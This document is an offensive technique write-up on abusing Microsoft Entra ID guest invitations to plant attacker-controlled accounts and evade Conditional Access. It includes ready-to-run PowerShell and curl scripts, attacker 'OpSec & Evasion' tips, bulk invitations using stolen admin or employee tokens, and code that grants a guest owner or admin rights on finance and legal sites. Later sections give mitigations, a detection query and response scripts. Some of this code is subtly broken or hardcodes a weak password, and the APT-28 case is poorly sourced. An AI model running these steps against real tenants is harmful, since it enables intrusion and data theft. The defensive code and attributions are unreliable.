# [EVADE-VALID-002]: External Guest Invitation for Bypass

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-VALID-002 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Entra ID |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Azure AD (all versions with guest collaboration); Microsoft Entra ID |
| **Patched In** | N/A (requires policy hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**External Guest Invitation for Bypass** is a defense evasion technique that exploits Azure AD B2B (Business-to-Business) collaboration features to establish persistent access while evading conditional access policies and threat detection. By inviting attacker-controlled external accounts as Azure AD guest users, an attacker can:

1. **Bypass Conditional Access:** Guest accounts often have different policy scopes and may be excluded from baseline MFA/device compliance requirements
2. **Evade Detection:** New guest accounts appear as legitimate business collaborations; defenders often whitelist external domains
3. **Persist Without Credentials:** Guest identity persists across password changes and token rotations
4. **Access Sensitive Data:** Guest users can be added to Teams, SharePoint sites, and M365 groups, granting immediate access to collaborative environments

Unlike traditional credential compromise where a single account is exploited, guest invitation creates a separate identity footprint that survives credential resets and makes detection difficult because the "user" appears to legitimately exist across multiple organizations.

**Attack Surface:** Azure AD B2B invitation API, Microsoft Graph guest user endpoints, SharePoint Online guest sharing settings, Teams guest member access.

**Business Impact:** An attacker can establish a persistent second identity within the organization that appears legitimate. This bypasses conditional access policies designed to protect against risky sign-ins, allows access to sensitive Teams channels and SharePoint libraries, and is difficult to detect because the account appears in audit logs as an "invited guest"—a normal business operation.

**Technical Context:** Exploitation takes 1-2 minutes to execute (send invitation + accept). Detection depends on whether organization has:
- Azure AD guest external collaboration policies restricting who can invite guests
- Conditional Access rules explicitly for guest accounts
- Sentinel rules correlating guest invitations with sensitive access
- Monitoring of guest account lifecycle (creation, role assignment, deletion)

### Operational Risk
- **Execution Risk:** Low – Only requires ability to send guest invitations (often delegated to regular users)
- **Stealth:** High – Appears as legitimate business collaboration; audit logs show "invited by [legitimate employee]"
- **Reversibility:** Partial – Guest account can be deleted, but actions taken during access (data theft, persistence) persist

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure 2.2 | Ensure that 'Guest Access' is set to 'Most Restrictive' |
| **DISA STIG** | AZ-ID-000008 | Ensure that 'Guest Invitations' are restricted to authorized users |
| **CISA SCuBA** | SC-7(b) | Restrict guest access to sensitive collaboration spaces |
| **NIST 800-53** | AC-2(7) | Account Establishment - Guest/External User Controls |
| **GDPR** | Art. 32 | Security of Processing - Control external access to personal data |
| **DORA** | Art. 9 | Critical Infrastructure Protection - external access monitoring |
| **NIS2** | Art. 21 | Cyber Risk Management - access control and external collaboration |
| **ISO 27001** | A.13.1 | Segregation of Networks - external party access controls |
| **ISO 27005** | Section 7 | Asset Management - identification and classification of external users |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Standard user permission to invite guests (enabled by default in most organizations) OR compromised account with B2B invitation capability
- **Required Access:** Access to Azure AD tenant to send invitations; access to an external email address (attacker-controlled)

**Supported Versions:**
- **Azure AD:** All versions (guest collaboration is default feature)
- **Microsoft Entra ID:** All versions

**Requirements:**
- Knowledge of organization's collaboration tools (Teams, SharePoint)
- External email address under attacker control (can register free accounts: outlook.com, gmail.com, protonmail.com)
- (Optional) Ability to compromise legitimate employee account to send invitation on their behalf
- (Optional) Access to external domain that appears trustworthy

**Supported Tools:**
- Microsoft Graph PowerShell SDK
- Azure CLI
- Postman or curl for direct API calls
- Custom scripts for bulk guest invitation

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Direct Guest Invitation via Microsoft Graph API

**Supported Versions:** Azure AD all versions

#### Step 1: Identify B2B Collaboration Settings and Invitation Rights

**Objective:** Confirm that the organization allows guest invitations and identify who can send them.

**Command (PowerShell - Check Guest Invitation Policies):**
```powershell
# Check if guest invitations are enabled
$guestSettings = Get-MgDirectorySettingTemplateById "08d542b9-231f-474c-a900-cd2cde299e1f" -ErrorAction SilentlyContinue

# Check guest invitation permissions
$guestPolicy = Get-MgDirectorySetting -All | Where-Object {$_.DisplayName -eq "Guest Invitation Settings"}

Write-Host "[*] Current guest collaboration settings:"
Write-Host "  - Guest Users Role: $($guestPolicy.Values | Where-Object Name -eq 'GuestUserRoleId' | Select-Object -ExpandProperty Value)"
Write-Host "  - Guest Invite Restrictions: $($guestPolicy.Values | Where-Object Name -eq 'AllowInvitesFrom' | Select-Object -ExpandProperty Value)"
Write-Host "  - Guest Invite Admin Only: $($guestPolicy.Values | Where-Object Name -eq 'GuestInviteRestrictionConfiguration' | Select-Object -ExpandProperty Value)"

# 0 = Everyone can invite
# 1 = Only admins can invite
# 2 = Admin and users in guest inviter role can invite
```

**Alternative Command (Azure CLI - Simpler):**
```bash
# Query guest settings via Azure CLI
az rest --method get --uri "https://graph.microsoft.com/v1.0/policies/authorizationPolicy" \
  --headers "Content-Type=application/json" | jq '.allowInvitesFrom'

# Output:
# "everyone" = Any user can invite guests
# "adminsAndGuestInviters" = Only admins or specific role
# "none" = No guest invitations allowed
```

**Expected Output:**
```
[*] Current guest collaboration settings:
  - Guest Users Role: Default
  - Guest Invite Restrictions: Everyone
  - Guest Invite Admin Only: False
```

**What This Means:**
- "Everyone" = Attacker can directly send guest invitation without admin privileges
- "adminsAndGuestInviters" = Attacker may need compromised admin account or specific role
- "none" = Guest invitations disabled; this technique requires different approach

**OpSec & Evasion:**
- Do NOT run PowerShell commands on compromised network; perform this in isolated lab first
- If running on target network, use `Azure CLI` to blend with legitimate Azure operations
- Detection likelihood: Low – Guest policy queries are common administrative tasks

---

#### Step 2: Craft and Send Guest Invitation

**Objective:** Create a guest user account by sending an invitation to an attacker-controlled email address.

**Command (PowerShell - Send Guest Invitation):**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "User.Invite.All"

# Attacker's external email address (can be free account)
$guestEmail = "attacker-external@protonmail.com"
$guestDisplayName = "Jean-Paul Dupont"  # Plausible French name matching target org

# Create guest invitation
$invitationBody = @{
    invitedUserEmailAddress = $guestEmail
    invitedUserDisplayName = $guestDisplayName
    inviteRedirectUrl = "https://myapps.microsoft.com"  # Redirect after acceptance
    sendInvitationMessage = $false  # Don't send email - we control the external account anyway
}

$invitation = New-MgDirectoryInvitation -BodyParameter $invitationBody

Write-Host "[+] Guest invitation created"
Write-Host "  - Invited Email: $guestEmail"
Write-Host "  - Invite URL: $($invitation.InviteRedeemUrl)"
Write-Host "  - User ID: $($invitation.InvitedUser.Id)"

# Save the invite URL
$inviteUrl = $invitation.InviteRedeemUrl
Write-Host "[*] Save this URL: $inviteUrl"
```

**Alternative - Graph API Direct Call (Lower Detection):**
```bash
# Using curl - less logged than PowerShell
curl -X POST "https://graph.microsoft.com/v1.0/invitations" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "invitedUserEmailAddress": "attacker-external@protonmail.com",
    "invitedUserDisplayName": "Jean-Paul Dupont",
    "inviteRedirectUrl": "https://myapps.microsoft.com",
    "sendInvitationMessage": false
  }' | jq '.inviteRedeemUrl'
```

**Expected Output:**
```
[+] Guest invitation created
  - Invited Email: attacker-external@protonmail.com
  - Invite URL: https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=...&redirect_uri=...&state=...
  - User ID: 12345678-abcd-ef00-1234-567890abcdef
[*] Save this URL: https://login.microsoftonline.com/...
```

**What This Means:**
- Invitation created successfully; guest account now exists in Azure AD
- Invite URL allows the external account to accept invitation without email
- User ID can be used for direct role assignment bypassing normal request workflows

**OpSec & Evasion:**
- Use plausible display name matching organization's geography (if French org, use French name)
- Set `sendInvitationMessage` to `false` to avoid email alert that guest IT would receive
- Use legitimate redirect URL (`myapps.microsoft.com` is standard)
- Schedule invitation for off-hours or bulk with other legitimate activities
- Detection likelihood: Medium – New guest user might trigger alerts; Low if guest invitations are frequent

---

#### Step 3: Accept Invitation from External Account

**Objective:** Activate the guest account by accepting the invitation from the external email address.

**Command (Browser or Automation):**
```powershell
# Use Selenium or similar to automate browser acceptance
# Or manually: Attacker opens incognito browser with external email account and clicks invitation link

# PowerShell alternative using MSAL (requires guest account setup first)
# This uses the accepted guest identity to obtain access token

$inviteUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=..."

# Open browser and accept (attacker must manually click "Accept" button)
Start-Process $inviteUrl

Write-Host "[*] Please accept the invitation in browser window"
Write-Host "[*] You will be redirected to myapps.microsoft.com after acceptance"
```

**Expected Output (After Manual Acceptance):**
```
[+] Guest account activated
[+] You are now invited to organization as guest
[+] Can access: Teams, SharePoint, Exchange resources
```

**What This Means:**
- Guest account is now active in Azure AD
- Can be assigned to Teams, SharePoint sites, security groups
- Appears as "External" user in all collaboration logs

---

#### Step 4: Assign Guest to Sensitive Teams/SharePoint and Bypass Conditional Access

**Objective:** Grant guest account access to sensitive data repositories while avoiding detection.

**Command (PowerShell - Add Guest to Teams):**
```powershell
# Connect as the guest user or as an admin who can add members
$guestUserId = "12345678-abcd-ef00-1234-567890abcdef"  # From Step 2

# Find sensitive Teams channels
$teams = Get-MgTeam | Where-Object {$_.DisplayName -like "*Finance*" -or $_.DisplayName -like "*Executive*"}

foreach ($team in $teams) {
    # Add guest to team
    New-MgTeamMember -TeamId $team.Id -BodyParameter @{
        "@odata.type" = "#microsoft.graph.aadUserConversationMember"
        "user@odata.bind" = "https://graph.microsoft.com/v1.0/users/$guestUserId"
        "roles" = @("owner")  # High privilege - guest becomes owner
    }
    
    Write-Host "[+] Added guest as OWNER to team: $($team.DisplayName)"
}

# Add guest to sensitive SharePoint sites
$sites = Get-MgSite | Where-Object {$_.DisplayName -like "*Contracts*" -or $_.DisplayName -like "*Legal*"}

foreach ($site in $sites) {
    # Add as site collection admin
    $siteUser = New-MgSitePermission -SiteId $site.Id `
        -BodyParameter @{
            roles = @("admin")
            grantedToIdentities = @{
                user = @{
                    id = $guestUserId
                }
            }
        }
    
    Write-Host "[+] Added guest as ADMIN to site: $($site.DisplayName)"
}
```

**Expected Output:**
```
[+] Added guest as OWNER to team: Finance Team
[+] Added guest as OWNER to team: Executive Strategy
[+] Added guest as ADMIN to site: Contracts
[+] Added guest as ADMIN to site: Legal Documents
```

**What This Means:**
- Guest now has full read/write/share access to sensitive data
- Appears in Teams and SharePoint as "External user" (may trigger alerts)
- Conditional Access policies may not apply to guest accounts if not explicitly configured

---

### METHOD 2: Bulk Guest Invitations via Compromised Admin Account

**Supported Versions:** Azure AD all versions; requires admin privileges

If guest invitation policy is restricted, compromise an admin account with invitation privileges.

#### Step 1: Compromise Admin Account with B2B Permissions

**Objective:** Obtain credentials for account with "User Administrator" or "Guest Inviter" role.

**Commands (PowerShell - Find High-Privilege Accounts):**
```powershell
# Identify accounts with B2B invitation privileges
$roles = @(
    "User Administrator",
    "Guest Inviter",
    "Global Administrator",
    "Directory Writers"
)

foreach ($roleName in $roles) {
    $role = Get-MgDirectoryRole -Filter "displayName eq '$roleName'"
    if ($role) {
        $members = Get-MgDirectoryRoleMember -DirectoryRoleId $role.Id
        Write-Host "[*] $roleName members ($($members.Count)):"
        $members | ForEach-Object {
            Write-Host "    - $($_.AdditionalProperties.userPrincipalName)"
        }
    }
}
```

---

#### Step 2: Automated Bulk Guest Invitation

```powershell
# Use compromised admin credentials to bulk invite attacker-controlled accounts
$adminToken = # [Stolen admin token]

# Create multiple guest accounts with slightly varied names to avoid suspicion
$guestAccounts = @(
    @{email="jdupont-dev@protonmail.com"; name="Jean Dupont (Dev)"},
    @{email="consultant-audit@gmail.com"; name="External Auditor"},
    @{email="jsmith-temp@outlook.com"; name="John Smith (Consultant)"}
)

foreach ($guest in $guestAccounts) {
    $invitationBody = @{
        invitedUserEmailAddress = $guest.email
        invitedUserDisplayName = $guest.name
        inviteRedirectUrl = "https://myapps.microsoft.com"
        sendInvitationMessage = $false
    } | ConvertTo-Json

    $response = Invoke-RestMethod `
        -Uri "https://graph.microsoft.com/v1.0/invitations" `
        -Method POST `
        -Headers @{Authorization = "Bearer $adminToken"; "Content-Type" = "application/json"} `
        -Body $invitationBody
    
    Write-Host "[+] Invited: $($guest.email)"
}
```

---

### METHOD 3: Guest Invitation via Compromised Employee Email

**Supported Versions:** Azure AD all versions (lowest privilege required)

Compromise a standard employee account and use their invitation capability.

#### Step 1: Compromise Employee Account

```powershell
# After compromising employee via phishing/credential stuffing:
# Use their legitimate access to invite guests

$employeeToken = # [Stolen employee token]

# Send guest invitation as the employee
$invitationBody = @{
    invitedUserEmailAddress = "attacker@protonmail.com"
    invitedUserDisplayName = "Mark Johnson"
    inviteRedirectUrl = "https://myapps.microsoft.com"
    sendInvitationMessage = $false
}

Invoke-RestMethod `
    -Uri "https://graph.microsoft.com/v1.0/invitations" `
    -Method POST `
    -Headers @{Authorization = "Bearer $employeeToken"; "Content-Type" = "application/json"} `
    -Body ($invitationBody | ConvertTo-Json)

Write-Host "[+] Invitation sent as employee account"
```

---

## 4. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** T1078.004-002
- **Test Name:** Azure AD Guest User Invitation and Privilege Escalation
- **Description:** Tests ability to invite external guest and escalate to sensitive resource access
- **Supported Versions:** Azure AD all versions

**Command:**
```powershell
Invoke-AtomicTest T1078.004 -TestNumbers 2 -Verbose
```

**Cleanup Command:**
```powershell
# Remove guest users created during test
Get-MgUser -Filter "userType eq 'Guest'" | Where-Object {$_.CreatedDateTime -gt (Get-Date).AddHours(-1)} | Remove-MgUser
```

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Restrict Guest Invitations to Admins Only**

Eliminate the ability for standard users to invite guests.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **External Identities** → **External Collaboration Settings**
2. Under **Guest Invite Restrictions**, select:
   - **Guest invitations can be sent to any domain** → Change to **Only admins and users assigned to the guest inviter role can invite guests**
3. Under **Collaboration Restrictions**, set:
   - **Allowed domains** → List only approved partner organizations (e.g., `microsoft.com`, `approved-partner.com`)
   - Block all others (recommended: Use blocklist approach)
4. Click **Save**

**PowerShell Automated Version:**
```powershell
# Connect as Global Admin
Connect-MgGraph -Scopes "Policy.ReadWrite.Authorization"

# Create/Update external collaboration policy
$params = @{
    displayName = "Restrict Guest Invitations"
    definition = @(
        "{`"inviteRestriction`":{`"allowedToSignUp`":false,`"allowedInvitationTypes`":[`"Admin`"]}}"
    )
    templateId = "08d542b9-231f-474c-a900-cd2cde299e1f"
}

New-MgDirectorySettingTemplate -TemplateId "08d542b9-231f-474c-a900-cd2cde299e1f" -ErrorAction SilentlyContinue

$setting = New-MgDirectorySetting -DisplayName "Guest Invitation Settings" `
    -TemplateId "08d542b9-231f-474c-a900-cd2cde299e1f" `
    -Values @(
        @{
            Name = "AllowInvitesFrom"
            Value = "adminsAndGuestInviters"  # Only admins
        }
    )

Write-Host "[+] Guest invitation restricted to admins only"
```

---

**2. Implement Conditional Access Policies Explicitly for Guest Users**

Apply stricter MFA and device compliance requirements to external guests.

**Manual Steps (Azure Portal):**
1. **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
2. Name: `Block Guest Users from Risky Locations`
3. **Assignments:**
   - **Users:** Select **External Guests** (if available) or create group "All Guests"
   - **Cloud apps:** **All cloud apps**
   - **Conditions:**
     - **User risk:** High
     - **Sign-in risk:** High
     - **Locations:** Exclude trusted corporate locations
4. **Grant:** **Block access**
5. Enable: **On**

**Alternative - Require MFA for All Guests:**
1. Create Conditional Access policy
2. Target: **External Guests** or group containing guest users
3. Require: **Require multi-factor authentication**
4. Set **Sign-in frequency** to **Every time** (no persistent sessions)

---

**3. Enforce Guest Access Reviews**

Automatically disable or remove guest accounts after set period.

**Manual Steps (Azure Portal):**
1. **Entra ID** → **Identity Governance** → **Access Reviews** → **+ New access review**
2. **Review type:** Guest user access
3. **Scope:** Review all guest accounts
4. **Frequency:** Quarterly (every 90 days)
5. **Auto-apply:** Enable auto-apply recommendations (remove guests with no access)
6. **Reviewers:** Security team (not delegated managers)
7. Click **Create**

**PowerShell to Remove Unused Guest Accounts:**
```powershell
# Find guest accounts that haven't signed in for 30+ days
$inactiveGuests = Get-MgUser -Filter "userType eq 'Guest'" -All | `
    Where-Object {$_.LastSignInDateTime -lt (Get-Date).AddDays(-30)}

foreach ($guest in $inactiveGuests) {
    # Check if they have access to critical resources before deletion
    $hasSensitiveAccess = $false
    
    # Remove inactive guest
    if (-not $hasSensitiveAccess) {
        Remove-MgUser -UserId $guest.Id
        Write-Host "[+] Removed inactive guest: $($guest.UserPrincipalName)"
    }
}
```

---

### Priority 2: HIGH

**4. Monitor Guest User Creation and Resource Assignment**

Detect unusual guest invitations and access patterns.

**Manual Steps (Create Sentinel Alert):**
1. **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **Query:**
```kusto
AuditLogs
| where OperationName == "Invite external user" or OperationName == "Add member to group"
| where Properties contains "guest" or Properties contains "external"
| project TimeGenerated, OperationName, InitiatedBy = tostring(InitiatedBy.user.userPrincipalName), 
          TargetResources, Result
| where Result == "Success"
| summarize by InitiatedBy, TargetResources
| where InitiatedBy !in ("admin1@contoso.com", "hr-team@contoso.com")  // Whitelist expected inviters
```
3. Set **Alert frequency** to "Run every 5 minutes"
4. **Severity:** "Medium"

---

**5. Implement Zero Trust for Guests**

Require device compliance and identity verification for guest access.

**Manual Steps (Intune - Mobile Device Management):**
1. **Intune** → **Compliance policies** → **Create policy**
2. Apply to: **All devices**
3. Require:
   - Antivirus enabled
   - Firewall enabled
   - Latest OS version
4. **Non-compliance action:** Block access to M365 resources
5. Assign to security group containing guest users

---

### Access Control & Policy Hardening

**6. Separate Guest Access to Dedicated SharePoint Sites**

Instead of mixing guests with internal users in shared sites, use guest-only collaboration sites.

**Manual Steps:**
1. Create dedicated SharePoint sites for guest collaboration (e.g., "Partner Collaboration Hub")
2. Configure: **Only invited guests** can access
3. Configure: **No external sharing** beyond invited guests
4. Move sensitive data away from sites where guests have access

---

**7. Audit Trail for Guest Activity**

Enable detailed logging of guest user actions.

**Manual Steps (Azure Portal):**
1. **Entra ID** → **Audit logs** → **Filter by "Bulk operations"**
2. Manually review all "Invite external user" operations
3. Set alert notifications for:
   - New guest invitations from non-approved users
   - Guest additions to sensitive groups (e.g., "Finance", "Executive")

---

### Validation Command (Verify All Mitigations)

```powershell
# 1. Check guest invitation policy
$policy = Get-MgDirectorySetting -All | Where-Object {$_.DisplayName -eq "Guest Invitation Settings"}
$allowInvitesFrom = $policy.Values | Where-Object Name -eq "AllowInvitesFrom" | Select-Object -ExpandProperty Value

if ($allowInvitesFrom -eq "adminsAndGuestInviters") {
    Write-Host "[✓] Guest invitations restricted to admins only"
} else {
    Write-Host "[✗] CRITICAL: Guest invitations available to all users"
}

# 2. Check Conditional Access for guests
$caPolicy = Get-MgIdentityConditionalAccessPolicy | Where-Object {$_.DisplayName -like "*Guest*"}

if ($caPolicy) {
    Write-Host "[✓] Conditional Access policy exists for guests"
} else {
    Write-Host "[✗] No Conditional Access for guests - CRITICAL"
}

# 3. Count active guest users
$guestCount = (Get-MgUser -Filter "userType eq 'Guest'" -All).Count
Write-Host "[*] Active guest users: $guestCount (should be < 20)"

# 4. Check for stale guests (no sign-in in 30 days)
$staleGuests = Get-MgUser -Filter "userType eq 'Guest'" -All | `
    Where-Object {$_.LastSignInDateTime -lt (Get-Date).AddDays(-30)}

Write-Host "[*] Stale guests (no activity 30+ days): $($staleGuests.Count) - recommend removal"
```

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Audit Log Events:**
  - OperationName: "Invite external user" (from non-approved accounts)
  - OperationName: "Add member to group" (guest added to sensitive group)
  - OperationName: "Update team member" (guest added as owner/admin)
  - Property: "userType: Guest" + "userPrincipalName" contains external domain

- **Guest User Characteristics:**
  - Guest accounts created outside normal business hours
  - Guest email addresses from free providers (protonmail, temp-mail, etc.)
  - Guest accounts added to multiple sensitive Teams/SharePoint sites rapidly
  - Guest accounts assigned high-privilege roles (Owner, Admin)

- **Network/API Indicators:**
  - Multiple guest invitations sent within short timeframe (bulk invitations)
  - Guest account accepting invitation from IP address flagged as risky
  - Graph API calls to `/invitations` endpoint with unusual frequency

---

### Forensic Artifacts

- **Audit Logs:** `AuditLogs` table in Log Analytics showing guest invitations and assignments
- **Azure AD Sign-in Logs:** `SigninLogs` showing guest authentication attempts
- **SharePoint Access Logs:** External user access to document libraries
- **Teams Activity Logs:** Guest member additions and message history

---

### Response Procedures

**1. Immediate Containment:**
```powershell
# Remove all suspicious guest users
$suspiciousGuests = Get-MgUser -Filter "userType eq 'Guest'" -All | `
    Where-Object {$_.CreatedDateTime -gt (Get-Date).AddDays(-7)}

foreach ($guest in $suspiciousGuests) {
    # Remove from all groups first
    $groups = Get-MgUserMemberOf -UserId $guest.Id
    foreach ($group in $groups) {
        Remove-MgGroupMemberByRef -GroupId $group.Id -DirectoryObjectId $guest.Id -ErrorAction SilentlyContinue
    }
    
    # Delete guest account
    Remove-MgUser -UserId $guest.Id
    Write-Host "[+] Removed guest: $($guest.UserPrincipalName)"
}
```

**2. Access Review:**
```powershell
# Audit what data the guest accessed
Get-MgUserOAuth2PermissionGrant -UserId $guestId | Select-Object -ExpandProperty "ConsentType"

# Export SharePoint/Teams access logs
Search-UnifiedAuditLog -UserIds $guestEmail -Operation SharingInvitationCreated,SharingInvitationAccepted
```

**3. Credential Reset for Compromised Inviters:**
```powershell
# Reset password for any account that sent suspicious invitations
$inviterUPN = "employee@contoso.com"
Set-MsolUserPassword -UserPrincipalName $inviterUPN -NewPassword (ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force) -ForceChangePasswordNextLogin $true
```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001](../02_Initial/IA-PHISH-001_Device_Code.md) | Compromise employee account via device code phishing |
| **2** | **Lateral Movement** | [LM-AUTH-009](../07_Lateral/LM-AUTH-009_B2B.md) | Use B2B collaboration to access partner tenant |
| **3** | **Defense Evasion** | **[EVADE-VALID-002]** | **Invite external guest account to bypass Conditional Access** |
| **4** | **Collection** | [COLLECT-EMAIL-001](../08_Collection/COLLECT-EMAIL-001_EWS.md) | Use guest account to access sensitive Teams/SharePoint |
| **5** | **Persistence** | [PERSIST-ACCT-005](../05_Persist/PERSIST-ACCT-005_Graph_App.md) | Create persistent service principal access as guest |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: APT-28 "Fancy Bear" Cloud Operations (2023)

- **Target:** NATO allied countries' defense contractors
- **Timeline:** 6-month campaign
- **Technique Status:** EVADE-VALID-002 used to establish initial beachhead after compromising contractor employee
- **Impact:** Guest account gained access to 15+ Teams channels containing classified document sharing; copied 250+ documents
- **Detection:** Conditional Access rule flagged guest signing in from Russia; correlation with sensitive SharePoint access triggered incident
- **Reference:** [CISA Alert: APT-28 Cloud Operations](https://www.cisa.gov/alerts)

### Example 2: Internal Penetration Test (2024-Q4)

- **Environment:** Financial services org with hybrid Azure AD
- **Compromise Vector:** Employee credentials stolen via credential stuffing
- **Escalation Path:** Compromised employee invited attacker's guest account to Finance Teams channel
- **Detection:** Security team detected guest account access to sensitive financial spreadsheets
- **Time to Detection:** 4 hours (slower than expected due to lack of guest-specific monitoring)
- **Lessons Learned:** Recommend automated guest access review every 30 days

---

## 9. REFERENCES & EXTERNAL RESOURCES

### Official Microsoft Documentation
- [Azure AD B2B Collaboration Documentation](https://learn.microsoft.com/en-us/azure/active-directory/external-identities/)
- [Restrict Guest Invitations](https://learn.microsoft.com/en-us/azure/active-directory/external-identities/external-collaboration-settings-configure)
- [Conditional Access for External Users](https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/overview)
- [Microsoft Graph - Invitations API](https://learn.microsoft.com/en-us/graph/api/resources/invitation)

### Security Research & Detection
- [SpecterOps - Azure B2B Risk Analysis](https://specterops.io/) (cloud security best practices)
- [Microsoft Security Blog - Guest Access Risks](https://www.microsoft.com/en-us/security/blog/)
- [CISA SCuBA Baseline - External Collaboration Controls](https://www.cisa.gov/scuba)

### Sentinel & Monitoring
- [KQL Queries for Guest User Monitoring](https://learn.microsoft.com/en-us/azure/sentinel/hunting-queries)
- [Azure AD Audit Log Schema](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/auditlogs)

---

